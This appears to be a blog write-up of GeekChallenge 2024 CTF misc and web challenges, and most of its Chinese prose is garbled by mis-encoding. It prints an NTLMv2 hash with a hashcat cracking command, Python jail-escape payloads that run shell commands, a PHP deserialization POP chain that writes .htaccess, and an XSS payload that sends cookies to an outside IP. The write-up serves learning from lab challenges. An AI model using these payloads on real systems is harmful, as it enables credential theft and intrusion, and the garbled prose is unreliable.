        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é›ª"><a href="#é›ª" class="headerlink" title="é›ª"></a>é›ª</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143524680.png" class="">  <p>å‹ç¼©åŒ…å°¾éƒ¨æœ‰éšå†™ï¼Œå¯ä»¥å¾—åˆ°è§£å‹å¯†ç ã€‚<br>æ‰“å¼€åæœ‰ä¸€å¼ å›¾ç‰‡å’Œä¸€å †ç©ºç™½å­—ä½“çŒœæµ‹ä¸ºsnowéšå†™<br>å›¾ç‰‡å­˜åœ¨ç›²æ°´å°<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143652853.png" class=""><br>å¾—åˆ°snowéšå†™çš„key<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143712469.png" class=""><br>å¾—åˆ°flag</p><h2 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-162058378.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å…ƒç»„ä¸­å­˜åœ¨<code>__ge__</code>é­”æœ¯æ–¹æ³•ï¼Œå…¶é€»è¾‘æ˜¯å¤§äºç­‰äºï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦<code>().__ge__(())</code>å°±å¯ä»¥å¾—åˆ°True True+True=2ã€‚æ„é€ å‡ºæ•°å­—å’Œå…¶å®å°±æ˜¯ä¸€æ­¥æ­¥ç®—ä¸Šå»äº†<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241031-234942312.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241031-234909658.png" class="">  </p><h2 id="Secret-of-Starven"><a href="#Secret-of-Starven" class="headerlink" title="Secret of Starven"></a>Secret of Starven</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110903265.png" class="">  <p>æ‰“å¼€æµé‡åŒ…ï¼Œæˆ‘ä»¬å¯¼å‡ºæ–‡ä»¶ä¼šå‘ç°æœ‰ä¸€å¼ å›¾ç‰‡å’Œå‹ç¼©åŒ…ï¼Œè¯´å®è¯å›¾ç‰‡è¿˜æŒºå¥½çœ‹(å˜¿å˜¿)<br>å‹ç¼©åŒ…éœ€è¦å¯†ç ï¼Œå›¾ç‰‡æ²¡æœ‰ä»€ä¹ˆéšå†™ï¼ŒçŒœæµ‹å¯†ç åº”è¯¥å¤–SMBçš„å¯†é’¥ï¼Œé€šè¿‡æµé‡åŒ…æ¥æ„é€ hashå€¼</p><p>username::damonname: server challenge:ntproofstr:æ— ntproofstrçš„ntlmv2_response<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111309721.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111444728.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111508123.png" class="">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Starven::192.168.11.20:9a35e37a04717230:189bf0b02d2f766af2242dc455ad4fe1:0101000000000000ca1f069a8a09db01980131a514a3d32d0000000002001e004400450053004b0054004f0050002d00510032004200390044004900410001001e004400450053004b0054004f0050002d00510032004200390044004900410004001e004400450053004b0054004f0050002d00510032004200390044004900410003001e004400450053004b0054004f0050002d00510032004200390044004900410007000800ca1f069a8a09db010600040002000000080030003000000000000000010000000020000044063d2e3ec53e332816d81a43ec5914e72ef2dc0599bfa08788e043eb523af80a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310031002e00320030000000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -O -a 0 -m 5600 2.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hashcodeçˆ†ç ´<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110735713.png" class=""><br>è§£å‹å‹ç¼©åŒ…<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110839450.png" class="">  </p><h2 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h2><p>æŸ¥çœ‹æºç æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è¿‡æ»¤äº†å¼•å·æ‹¬å·å’Œ@<br>å‚è€ƒæ–‡ç« <a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/</a><br>é€šè¿‡æ–‡ç« æˆ‘ä»¬å¯ä»¥çŸ¥é“å¯ä»¥è¯•ç”¨enumæ¥è¿›è¡Œé€ƒé€¸payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import enum</span><br><span class="line">from os import system</span><br><span class="line"></span><br><span class="line">enum.EnumMeta.__getitem__ = system</span><br><span class="line">enum.Enum[request.args[&#123;&#125;.__doc__[2]+&#123;&#125;.__doc__[15]+&#123;&#125;.__doc__[0]]]</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯é¢˜ç›®å› ä¸º50ä¸ªå­—ç¬¦çš„é™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥ç…§æ¬ï¼Œæœ€åçš„å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†æˆ‘ä»¬å¯ä»¥ç”¨<code>a=[].__doc__[i]</code>çš„æ–¹æ³•æ¥å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œç„¶åå†æ‹¼æ¥å˜é‡å³å¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for j in &quot;env&quot;:</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        if [].__doc__[i]==j:</span><br><span class="line">            print(&#123;&#125;.__doc__[i])</span><br><span class="line">            print(&quot;%c=[].__doc__[%d]&quot; %(j,i))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-002556300.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-002536906.png" class="">  <h2 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h2><p>åœ¨å®é‡Œæœ‰flag2<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112720393.jpg" class=""><br>wordé‡Œè°ƒè‰²æœ‰flag1<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112727102.jpg" class=""><br>è§£å‹wordå¯ä»¥æ‰¾åˆ°flag3<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112731032.jpg" class=""><br>æ‹¼èµ·æ¥å°±æ˜¯flagï¼ˆå¥½ä¹…ä¹‹å‰æˆªçš„å›¾äº†ï¼Œé¢˜ç›®ä¹Ÿä¸èƒ½å†æ¬¡æäº¤flagï¼Œä½†åº”è¯¥æ²¡æœ‰é”™ï¼‰</p><h2 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h2><p>pythoné€ƒé€¸å¯ä»¥ç¦ç”¨äº†å¾ˆå¤šä½†æ˜¯å¯ä»¥ä½¿ç”¨sstiçš„æ–¹æ³•æ¥åšï¼Œå­—ç¬¦ä¸²å…¨ä½¿ç”¨chr(xxx)æ¥è¿›è¡Œä»£æ›¿ä»è€Œç»•è¿‡å¼•å·ç­‰<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;è¾“å…¥å­—ç¬¦ä¸²&#x27;</span>)</span><br><span class="line">    s = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">    pay = <span class="string">&quot;print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](&#123;&#125;).read())&quot;</span></span><br><span class="line">    ch = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ch+=<span class="string">&quot;chr(&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">if</span> ch.endswith(<span class="string">&#x27;+&#x27;</span>):</span><br><span class="line">        ch = ch[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(pay.<span class="built_in">format</span>(ch))</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(105)+chr(110)+chr(100)+chr(32)+chr(47)+chr(32)+chr(45)+chr(110)+chr(97)+chr(109)+chr(101)+chr(32)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>å‘ç°flagåœ¨/home/ctf/flagé‡Œ<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-113854792.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-113311916.png" class="">  <h2 id="èˆ”ç‹—çš„è§‰é†’"><a href="#èˆ”ç‹—çš„è§‰é†’" class="headerlink" title="èˆ”ç‹—çš„è§‰é†’"></a>èˆ”ç‹—çš„è§‰é†’</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-125248135.png" class="">  <p>å¯†ç å¯ä»¥çˆ†ç ´<br>è§£å‹ååˆæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…çš„å­—èŠ‚ç¿»è½¬<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-125455997.png" class=""><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_hex_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="comment"># è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">        hex_str = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç§»é™¤ç©ºæ ¼å’Œæ¢è¡Œç¬¦</span></span><br><span class="line">        hex_str = hex_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¿»è½¬æ¯ä¸¤ä¸ªå­—ç¬¦</span></span><br><span class="line">        reversed_str = <span class="string">&#x27;&#x27;</span>.join([hex_str[i+<span class="number">1</span>] + hex_str[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> reversed_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹è°ƒç”¨</span></span><br><span class="line">file_path = <span class="string">&#x27;c:\\Users\\24882\\Downloads\\èˆ”ç‹—çš„è§‰é†’\\byte-revenge.txt&#x27;</span>  <span class="comment"># æ›¿æ¢ä¸ºä½ çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">result = process_hex_file(file_path)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è§£å‹åå¾—åˆ°ä¸€ä¸ªflag.pdf<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-130302330.png" class=""><br>å°†å…¶è½¬ä¸ºword<br>è§£å‹wordåå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-130515552.png" class="">  </p><h2 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h2> <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114301834.png" class="">  <p>ç½‘ä¸Šæœå¯ä»¥æœåˆ°è¿™ä¸ªå¼€æºé¡¹ç›®<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114832885.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114944458.png" class="">  </p><p>åœ¨å®ç°ç»†èŠ‚å¯ä»¥æ‰¾åˆ°æ¯ä¸ªç¬¦å·å¯¹åº”çš„äºŒè¿›åˆ¶ã€‚é¢˜ç›®çš„ç¬¦å·æ˜¯ä¸¤ä¸ªä¸€ç»„ï¼Œå…¶å®å°±æ˜¯å°†ç»„æˆçš„å€¼è½¬ä¸ºasciiç å­—ç¬¦ç½¢äº†<br>å¾—åˆ°å¦‚ä¸‹äºŒè¿›åˆ¶<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01010011 01011001 01000011 01111011 01000001 01101110 00110000 01110100 01101000 00110011 01110010 01011111 01000001 01101101 01000000 01111010 00110001 01101110 00111001 01011111 01010001 01010010 01011111 01000011 01101111 00110100 01100101 01111101</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-115110431.png" class=""><br>å› ä¸ºæ˜¯è§£åè¿‡äº†å¾ˆä¹…åˆå†å†™çš„ï¼Œæ€è·¯æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºæ— æ³•å†æ¬¡æäº¤flagæ‰€ä»¥åœ¨è½¬äºŒè¿›åˆ¶çš„æ­¥éª¤ä¸­å¯èƒ½ä¼šæœ‰ç‚¹å°é—®é¢˜ã€‚ä½†æ˜¯æ€è·¯æ˜¯ç»å¯¹æ²¡é—®é¢˜çš„</p><h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><p>æ‰“å¼€ç¦å»ºæ˜¯ä¸€æ®µbase64ç¼–ç <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-120534904.png" class=""><br>å¯ä»¥å‘ç°æ˜¯é¢ å€’çš„jpgå›¾ç‰‡<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-120951065.jpg" class=""><br>å¾—åˆ°çš„å›¾ç‰‡å¦‚ä¸Šï¼Œæ˜æ˜¾æ˜¯å®½é«˜å‡ºäº†é—®é¢˜ï¼Œæˆ‘ä»¬ä»æ°”å·¦å³åç§»å¯ä»¥çŒœæµ‹å‡ºæ˜¯å®½åº¦å‡ºæ¥é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¸æ–­çš„è°ƒæ•´äº†æœ€ååœ¨äº§ç”Ÿåˆ°8æ˜¯å¾—åˆ°äº†å¯ä»¥å®Œç¾çš„å›¾ç‰‡<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-121751506.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-121909337.png" class="">  </p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP-&gt;starven=<span class="string">&#x27;php://filter/write=string.strip_tags/resource=?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/../../.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;J1rry=<span class="string">&quot;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™ä¸ªååºåˆ—åŒ–çš„é“¾å­è¿˜æ˜¯æŒºç®€å•çš„ï¼Œå…¶å®å°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lover&#123;__destruct&#125;-&gt;Geek&#123;__get()&#125;-&gt;lover&#123;__invoke&#125;-&gt;Geek&#123;__toString&#125;-&gt;SYC&#123;__call&#125;</span><br></pre></td></tr></table></figure><br>å…¶å®æœ‰ä¸¤ä¸ªwafç¬¬ä¸€ä¸ªæ£€æµ‹meimengå¯ä»¥ç›´æ¥ä½¿ç”¨å¤§å†™SåŠ 16è¿›è¡Œç»•è¿‡ã€‚file_get_contents($this-&gt;J1rry)å°±ç›´æ¥ä½¿ç”¨data://åè®®å³å¯<br>æœ€åå†™å…¥æ–‡ä»¶æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡exitå‡½æ•°ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰æ‰¾ä¸åˆ°ç¼–ç çš„è¿‡æ»¤å™¨äºæ˜¯æˆ‘ä½¿ç”¨string.strip_tagså»é™¤exitç„¶åå°†php_value auto_prepend_file â€œ/flagâ€å†™å…¥.htaccessä½¿å¾—phpæ–‡ä»¶åŒ…å«/flagè¿™æ ·åœ¨è¾“å…¥payloadæ—¶å°±æœ‰æœºä¼šå°†flagå¸¦å‡ºæ¥ï¼ˆå¶ç„¶è¯•å‡ºæ¥çš„ï¼‰ï¼Œï¼ˆæ­£è§£åº”è¯¥æ—¶è¦å†™å…¥ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œç„¶åå°†å…¶è§£æä¸ºphpæ–‡ä»¶ï¼Œä¹‹åå†æ–‡ä»¶å¤´å¼•å…¥/flagï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥å¾—åˆ°flagäº†ï¼‰<a href="https://jututu.top/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/">https://jututu.top/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:5:&quot;lover&quot;:2:&#123;s:5:&quot;J1rry&quot;;s:61:&quot;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&quot;;S:7:&quot;\6Deimeng&quot;;O:4:&quot;Geek&quot;:1:&#123;s:4:&quot;GSBP&quot;;O:5:&quot;lover&quot;:2:&#123;s:5:&quot;J1rry&quot;;N;S:7:&quot;\6Deimeng&quot;;O:4:&quot;Geek&quot;:1:&#123;s:4:&quot;GSBP&quot;;O:3:&quot;SYC&quot;:1:&#123;s:7:&quot;starven&quot;;s:101:&quot;php://filter/write=string.strip_tags/resource=?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/../../.htaccess&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-141954645.png" class="">  </p><h2 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-164205292.png" class="">  <p>å‘ç°ç®¡ç†å‘˜botä¼šæµè§ˆç•™è¨€æ¿ï¼ŒçŒœæµ‹ä¸ºxssï¼Œä¸”flagå†cookieä¸­,ä¸”xssæ²¡æœ‰è¿‡æ»¤<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://xxx.xxx.38.159:8000/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-164601914.png" class=""><br>éœ€è¦æœ¬åœ°ipï¼Œè¿›è¡Œä¸€ä¸‹ipå¤´ä¼ªé€ (æˆ‘æ˜¯ç›´æ¥ç”¨bpæ’ä»¶çš„)</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172606627.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172829581.png" class="">  <p>åé¢å‘ç°å¥½åƒä¸ç”¨ä¼ªé€ ipã€‚ã€‚ã€‚ä¸»è¦æ˜¯ä¸€å¼€å§‹ç›´æ¥ç”¨ipä¸çŸ¥é“ä¸ºä»€ä¹ˆæŠ¥é”™äº†<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172918900.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173033465.png" class="">  </p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p>ç­¾åˆ°é¢˜å°±ä¸å¤šè¯´äº†<br><img 